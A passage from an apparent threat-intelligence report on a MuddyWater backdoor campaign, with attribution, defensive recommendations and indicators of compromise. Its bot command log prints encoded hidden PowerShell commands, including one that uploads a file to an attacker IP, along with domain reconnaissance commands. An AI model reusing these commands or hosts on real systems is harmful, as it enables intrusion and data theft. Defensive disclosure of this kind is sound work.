+--- 2026-01-28 15:05:28 --- Unknown command: cmd
+--- 2026-01-28 14:47:46 --- whoami
+--- 2026-01-28 12:42:10 --- whoami
+--- 2025-10-12 09:19:00 --- ping -n 2 -a 
+--- 2025-10-12 08:47:54 --- ipconfig
+--- 2025-10-12 08:46:28 --- powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand  dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+--- 2025-10-12 08:39:00 --- nslookup ad
+--- 2025-10-07 16:23:02 --- ipconfig /all
+--- 2025-10-07 16:12:13 --- ipconfig /all
+--- 2025-10-06 14:38:30 --- ping -n 2 -a 
+--- 2025-10-06 14:38:03 --- ping -n 2 -a 
+--- 2025-10-06 14:37:32 --- ping -n 2 -a 
+--- 2025-10-06 12:56:44 --- ping -n 2 -a 
+--- 2025-10-06 12:56:38 --- ping -n 2 -a 
+--- 2025-10-06 12:54:06 --- ipconfig /all
+--- 2025-10-06 12:49:28 --- net group \"domain admins\" /do
+--- 2025-10-06 12:47:41 --- powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand  dgBhAGMAcgBvAHMAeQBzAGkAOwAkAHYAYQBjAHIAbwBzAHkAcwBpAD0AIgB2AGEAYwByAG8AcwB5AHMAaQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAEYATQBBAFAAUAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+--- 2025-10-06 12:47:22 --- ✅ File downloaded to .\\FMAPP.dll !
+--- 2025-10-06 12:47:09 --- ✅ File downloaded to .\\FMAPP.exe !
+--- 2025-10-06 12:41:06 --- dir
+--- 2025-10-06 12:40:18 --- powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand  YQBqADsAJABhAGoAPQAiAGEAagAiADsAJAB3AGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAAgADsAIAAkAHIAZQBzAHAAIAA9ACAAJAB3AGMALgBVAHAAbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEANAAzAC4AMQA5ADgALgA1AC4ANAAxADoANAA0ADMALwBzAHUAYwBjAGUAcwBzACIALAAiAGMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAZABvAHcAbgBsAG8AYQBkAHMAXABjAG8AYgBlAC0AbgBvAHQAZQBzAC4AdAB4AHQAIgApADsA
+--- 2025-10-06 12:39:43 --- dir c:\\users\\public\\downloads
+--- 2025-10-06 12:39:01 --- dir
+--- 2025-10-06 12:38:33 --- Unknown command: tasklist
+--- 2025-10-06 12:36:47 --- net user /do
+--- 2025-10-06 12:36:47 --- net user /do
+--- 2025-10-06 12:36:46 --- net user /do
+--- 2025-10-06 12:36:46 --- net user /do
+--- 2025-10-06 12:36:46 --- net user /do
+--- 2025-10-06 12:36:45 --- net user /do
+--- 2025-10-06 12:36:45 --- net user /do
+--- 2025-10-06 12:36:25 --- dir
+--- 2025-10-06 12:36:10 --- dir c:\\users\\\\appdata
+--- 2025-10-06 12:35:41 --- whoami
+--- 2025-10-06 12:35:21 --- powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand  dwBrAG4AbABoAGEAOwAkAHcAawBuAGwAaABhAD0AIgB3AGsAbgBsAGgAYQAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHMAaAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=
+--- 2025-10-06 12:34:58 --- dir
+--- 2025-10-06 12:34:46 --- ✅ File downloaded to .\\sh.exe !
+--- 2025-10-06 12:34:29 --- ✅ File downloaded to .\\dllapp.dll !
+--- 2025-10-06 12:34:10 --- cd
+--- 2025-10-06 11:47:03 --- powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -EncodedCommand  ZgBkAGgAYgBxAHkAcgA7ACQAZgBkAGgAYgBxAHkAcgA9ACIAZgBkAGgAYgBxAHkAcgAiADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAGcAcwBoAGQAbwBjAF8AcgBlAGwAZQBhAHMAZQBfAFgANgA0AF8ARwBVAEkALgBlAHgAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4A
+--- 2025-10-06 11:46:26 --- cd
+--- 2025-10-06 11:45:42 --- gshdoc_release_X64_GUI.exe gshdoc.exe
+--- 2025-10-06 11:32:14 --- dir
+--- 2025-10-06 11:32:09 --- Unknown command: /promot
+--- 2025-10-06 11:31:58 --- ✅ File downloaded to .\\gshdoc_release_X64_GUI.exe !
+--- 2025-10-06 11:31:33 --- ✅ Directory changed to c:\\programdata
+--- 2025-10-06 11:30:46 --- ❌ Download Failed: Access is denied. (os error 5)
+--- 2025-10-06 10:57:00 --- ping -n 2 -a 
+--- 2025-10-06 10:56:44 --- ipconfig /all
+Potential Threat Actor Information
+Analysis of the bot logs suggests that the threat actor tested the backdoor on their own machine prior to the  second operation in late January 2026. Several commands (shown below) appear to have been executed by the bot, potentially on the threat actor machine, as evidenced by usernames and directory paths identified in the logs.
+
+The username DontAsk was observed as the “author” and “last modified by” in the malicious Microsoft Office documents used in phishing emails. Additionally, the username Jacob was observed in previous malware samples within the PDB paths and embedded strings.
+
+Command Date	2026-01-28 15:22:35
+Current Working Directory	C:\Users\DontAsk\Documents
+Command	whoami /all
+Output	
+None
+USER INFORMATION
+----------------
+
+User Name                SID
+======================= ==============================================
+desktop-9524r2b\dontask  S-1-5-21-644383349-457702852-3382530326-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                Type            SID             Attributes
+========================================  ==============  ==============  ======================================
+Everyone                                  Well-known      S-1-1-0         Mandatory group, Enabled by default
+NT AUTHORITY\Local account and member     Well-known      S-1-5-114       Group used for deny only
+BUILTIN\Administrators                    Alias           S-1-5-32-544    Group used for deny only
+BUILTIN\Performance Log Users             Alias           S-1-5-32-559    Mandatory group, Enabled by default
+BUILTIN\Users                             Alias           S-1-5-32-545    Mandatory group, Enabled by default
+NT AUTHORITY\INTERACTIVE                  Well-known      S-1-5-4         Mandatory group, Enabled by default
+CONSOLE LOGON                             Well-known      S-1-2-1         Mandatory group, Enabled by default
+NT AUTHORITY\Authenticated Users           Well-known      S-1-5-11        Mandatory group, Enabled by default
+NT AUTHORITY\This Organization             Well-known      S-1-5-15        Mandatory group, Enabled by default
+NT AUTHORITY\Local account                 Well-known      S-1-5-113       Mandatory group, Enabled by default
+LOCAL                                     Well-known      S-1-2-0         Mandatory group, Enabled by default
+NT AUTHORITY\NTLM Authentication           Well-known      S-1-5-64-10     Mandatory group, Enabled by default
+Mandatory Label\Medium Mandatory Level     Label           S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                 Description                     State
+=============================  ==============================  ========
+SeShutdownPrivilege            Shut down the system            Disabled
+SeChangeNotifyPrivilege        Bypass traverse checking        Enabled
+SeUndockPrivilege              Remove computer from docking    Disabled
+SeIncreaseWorkingSetPrivilege  Increase a process working set  Disabled
+SeTimeZonePrivilege            Change the time zone            Disabled
+The information above shows that DontAsk is a standard local user and the machine is not a part of any domain, and the hostname is desktop-9524r2b.
+
+Date	2026-01-28 12:42:10
+Current Working Directory	C:\\Users\\Jacob\\Documents\\Char\\target\\x86_64-pc-windows-msvc\\release
+Command	whoami
+Output	ultra\\jacob
+An interesting note here is the domain name for the user jacob, which is ultra.
+
+The current working directory appears to correspond to the build path where the CHAR backdoor was compiled in release mode. In addition, strings extracted from the CHAR binary reference the username Jacob, consistent with paths associated with Rust library locations. The same paths were observed in the BlackBeard malware attributed to MuddyWater.
+
+Figure 16. CHAR and BlackBeard malware Development Environment.
+
+This activity suggests that the threat actor likely used the Telegram bot to test the backdoor’s functionality prior to the operation, during the period between 2026-01-28 12:42:10 and 2026-01-28 15:22:35 (UTC+3). This timeframe aligns with the preparation phase observed ahead of the January campaign.
+
+Attribution Assessment
+Group-IB attributes this campaign to MuddyWater with high confidence based on several factors and evidences as outlined below:
+
+The C2 server hosts a malicious Reverse socks5 malware (FMAPP.dll, hash: 62ED16701A14CE26314F2436D9532FE606C15407) similar to the reverse socks5 mentioned in this report [1].
+The Malicious macros match the logic consistent with observed in multiple recent MuddyWatercampaigns. “02ccc4271362b92a59e6851ac6d5d2c07182064a602906d7166fe2867cc662a5”.
+Read “UserForm1.TextBox1.Text” and decode it using the same way,
+Using the same sleep method (4 nested loop for add operation),
+Drop a file to the .log file wither in public user directory or current user download directory,
+Executing the dropped file.
+The GhostFetch and GhostBackDoor employ the same string decoding techniques observed in other MuddyWater-linked malware.
+The CHAR malware has similar structure and development environment as the Rust-based malware BlackBeard (aka “Archer RAT”, sha-1: 326b808f4f933f20e4e8686e9a6e93454c8ed334).,
+Post-exploitation activity strongly matching MuddyWater’s known toolset and operational patterns.
+Infrastructure overlap with previously identified MuddyWater C2 infrastructure (netvigil[.]org).
+Conclusion
+The MuddyWater APT group remains an active threat within the META region,with this operation primarily targeting organizations in the MENA region. The group’s continued adoption of AI technology, combined with continued development of custom malware and tooling and diversified Command & Control (C2) infrastructures, underscores their dedication and intent to expand their operations.
+
+The Group-IB Threat Intelligence team recognizes this threat and  continues to closely monitor its activity in order to provide actionable intelligence, enabling  organizations to anticipate evolving threats and strengthen their defensive posture accordingly .
+
+Recommendations
+Organizations can reduce exposure to MuddyWater-linked activity by implementing the following measures, informed by observed tactics and techniques used across the GhostFetch and related malware families.
+
+Strengthen Threat Intelligence and Monitoring
+Conduct continuous threat hunting for indicators associated with GhostFetch, CHAR and related infrastructure.
+Integrate YARA Rules and  and Endpoint Detection and Response (EDR) detections for  known MuddyWater malware families. l
+Subscribe to threat intelligence feeds to receive up-to-date Indicators of Compromise (IOCs) and Tactics, Techniques, and Procedures (TTPs) related to MuddyWater.
+Enhance Email and Phishing Defenses
+Disable Office macros by default through Group Policy, allowing execution only from signed or trusted sources, as the campaign originates from malicious document variants.
+Deploy advanced attachment sandboxing capable of simulating user interaction, as GhostFetch validates mouse movement and execution timing to evade automated analysis.
+Conduct regular phishing simulations and awareness training for personnel, emphasizing lures that prompt users to “enable content” in attached documents.
+Implement Endpoint and Access Controls
+Restrict, monitor, and audit the use of remote monitoring and management (RMM) tools such as AnyDesk, which is leveraged as a secondary payload in this campaign.
+Deploy and tune EDR solutions to detect reflective code loading and in-memory execution, as GhostFetch decrypts AES-encrypted payloads and loads them directly into memory.
+Monitor for the creation of unauthorized services, such as MicrosoftVersionUpdater, and unusual modifications to the User Shell Folders\Startup registry path.
+Strengthen Network and Infrastructure Security
+Monitor and, where appropriate, restrict outbound traffic to Telegram Bot API endpoints, as the CHAR backdoor relies on this service for command-and-control communications.
+Block known malicious domains, such as promoverse[.]org, and monitor for repeated beaconing or anomalous connections to suspicious endpoints.
+Use network behavioral analysis to identify SOCKS5 reverse proxy activity, particularly those introduced by injected modules such as FMAPP.dll.
+Build Long-Term Strategic Defense
+Ensure internal analysis and sandbox environments are configured with more than 2 GB of RAM and at least 2 CPU cores to prevent malware like GhostFetch from identifying the environment as a sandbox and self-terminating.
+Enforce least-privilege access controls to limit the ability of malware to install itself as a system service or establish persistent access.
+Indicators of Compromise (IOCs)
+Type	Value	Comment
+Domain	codefusiontech.org	HTTP_VIP C2
+Domain	Promoverse.org	GhostFetch C2
+Domain	miniquest.org	HTTP_VIP C2
+Domain	jerusalemsolutions.com	
+IP	162.0.230.185	
+IP	209.74.87.100	
+IP	143.198.5.41	
+IP	209.74.87.67	
+SHA1	f4e0f4449dc50e33e912403082e093dd8e4bc55d	AnyDesk.exe
+SHA1	3441306816018d08dd03a97ac306fac0200e9152	chrome_inject.exe
+SHA1	9ca11fcbd75420bd7a578e8bf6ef855e7bd0fb8e	ex-server
+SHA1	06f3b55f0d66913cd53d2f0e76a5e2d67ff8ed04	client.exe
+SHA1	7bd04218276fc8f375c0ce3be43a710f6a2b4d09	AnyDesk.exe
+SHA1	2f5166086da5a57d7e59a767a54ed6fe9a6db444	lpu.exe
+SHA1	8c592d9ab58264e68dfe029ea90f80862c526670	067de891d4624fc09de1c690b01d8bf477f69f0ce81f8101b21b3549
+SHA1	f779a3b1dcc0c3aacacf7ebfa4ed57d53af7e26c	data.bin
+SHA1	2993b0ab9786ddc29eb9cf1ace4a28c6e34ea4fb	Performance.doc
+SHA1	e3cc95ca6e271ddf04cd88c85051b2cc9ce04e8e	resocks-64.exe
+SHA1	270dbaedfbeef9333e0780f3c4e74c01392ce381	AnyDesk38.exe
+SHA1	d3fa50a9eba93a7fbc79e7ad0c4889d762718a5f	FMAPP.dll
+SHA1	392a36717fa948f7e00d35711e8598108fbe2f72	client.exe
+SHA1	62ed16701a14ce26314f2436d9532fe606c15407	FMAPP.dll
+SHA1	ceb9b7dfb8a36ee8fe223063a6e3f730f2dcefd1	resocks-64.dll
+SHA1	88cb6169fd7dd21e6d6aa3a8df0a78938e698028	resocks-32.exe
+SHA1	d0d7d0c816753639b5c577aacf14fd2e994b64b0	reset.ps1
+SHA1	b55e063607e8f56c9b398b289ba04ddca11398fe	AnyDesk14.exe
+SHA1	5c1500296857ed0b0bb7230a1cb17993d25ab69b	resocks-32.dll
+SHA1	f449b95830c584cef72dfb60fb78ee3d6c69ecb4	x.exe
+SHA1	3c47eab6ebe5b48097c0099ff18f2a8bc13c12f7	AnyDesk72.exe
+SHA1	324918c73b985875d5f974da3471f2a0a4874687	FMAPP.exe
+SHA1	e21564fd0fc3103c1d18b1e1525a0b40e9077d40	ThisDocument.cls
+SHA1	feb4318a90057d92ea5ab6420ed6164dd9605013	ThisDocument.cls
+SHA1	0365daf83e37d2c6daaae6c28b4c8343288ef2f9	intercom.doc
+SHA1	777040bed9d26f5da97e8977c6efc0586beae064	
+SHA1	f5a129ba4141361ca266950dc4adcb2c548aa949	
+SHA1	f77499a8fc6e615e21bf111a88c658ba3d5f0f81	
+SHA1	dc785be0c4430bfc5b507255f892bf30134a02b6	attachment.xls
+SHA1	e79ccc3f6517c911d6c1df79c94e88896f574e64	ticket.doc
+SHA1	2eea39dbe11889e5713cbca020f7ede653bc48ec	ThisWorkbook.cls
+SHA1	975c763e050d0a9a46f0aafdde66d3e7f0626c5b	ticket.doc
+SHA1	d97d21536c061e7a7151a453242d36f3ab196a14	%USERPROFILE%\downloads\pic.log
+SHA1	56380a652471962387693f4bcc893fd21f0fc324	
+SHA1	9defffba933fc44f8e3b6e25b31508bc17d29077	CertificationKit.exe
+SHA1	efb18cf7cf227037e034c0b525f502e642815f94	avp.exe
+SHA1	0588cf26b6e9210f86a266ac0366af1fd29f135c	
+SHA1	80cea18e19665c5a57e7b9ca0bf36aad06096e93	burn.exe
+SHA1	7d3757d5165e2e95b0b89e33316025a4b9301e2d	aee523056d602571ff006565b432148715a6a13d098d518ba8131ccbe719c043
+SHA1	ac982b7b46e085e0bb51cba2edb61bff5910b6a8	3a19c19d9f3bac6628a968110477ee01e5867b2534e914e1be5c4485947bd819
+SHA1	8632b62fa14fd679fa97cfe50e6c25696b846129	ThisDocument.cls
+SHA1	ea80deaed00c8b71aa0033b00fe0ef5b63840b99	ThisDocument.cls
+SHA1	92e2f826804d762679b13283102f3560078eb4cb	ThisDocument.cls
+DISCLAIMER: All technical information, including malware analysis, indicators of compromise and infrastructure details provided in this publication, is shared solely for defensive cybersecurity and research purposes. Group-IB does not endorse or permit any unauthorized or offensive use of the information contained herein. The data and conclusions represent Group-IB’s analytical assessment based on available evidence and are intended to help organizations detect, prevent, and respond to cyber threats.
+
+Group-IB expressly disclaims liability for any misuse of the information provided. Organizations and readers are encouraged to apply this intelligence responsibly and in compliance with all applicable laws and regulations.
+
+This blog may reference legitimate third-party services such as Telegram and others, solely to illustrate cases where threat actors have abused or misused these platforms.
+
